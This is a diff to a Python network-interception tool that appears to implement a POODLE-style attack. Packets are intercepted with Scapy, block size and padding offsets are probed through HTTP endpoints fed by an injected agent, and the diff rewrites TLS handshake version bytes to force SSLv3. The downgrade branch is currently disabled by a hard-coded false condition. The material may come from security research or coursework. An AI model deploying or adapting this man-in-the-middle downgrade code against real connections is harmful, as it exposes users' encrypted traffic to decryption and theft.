@@ -67,7 +67,7 @@ def modify_and_send_packet(packet, pkt):
 
 with output(output_type='list', initial_len=5) as output_list:
 
-	output_list[0] = 'Finding Block Length...'
+	output_list[0] = 'Waiting for agent...'
 
 	def print_state(ciphertext_length = None, math_str = None):
 		current_index = (((block_to_move + 1) * block_size) - current_offset) if block_size is not None else 0
@@ -99,6 +99,7 @@ with output(output_type='list', initial_len=5) as output_list:
 		global current_offset
 		global count
 		global dns_mapping
+		global server_ip
 
 		pkt = IP(packet.get_payload())
 
@@ -156,9 +157,12 @@ with output(output_type='list', initial_len=5) as output_list:
 
 			# TLS Downgrade
 			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "handshake" and get_field(pkt['TLS'], 'version') != 'SSLv3' and False:
-				pkt[TCP].flags = 'FA'
-				pkt[TCP].len = 0
-				pkt[TCP].remove_payload()
+				# 0x0300 is SSLv3
+				pkt[TCP].payload[1] = 0x03
+				pkt[TCP].payload[2] = 0x00
+				#pkt[TCP].flags = 'FA'
+				#pkt[TCP].len = 0
+				#pkt[TCP].remove_payload()
 				modify_and_send_packet(packet, pkt)
 				return
 
@@ -308,6 +312,7 @@ with output(output_type='list', initial_len=5) as output_list:
 				time.sleep(0.1)	
 
 			if self.path == '/blocksize':
+				output_list[0] = 'Finding Block Size...'
 				content = bytes(str(block_size) + " " + str(int(data_padding_size_needed + 1)), 'utf8')
 			elif self.path == '/offset':
 				count = 0
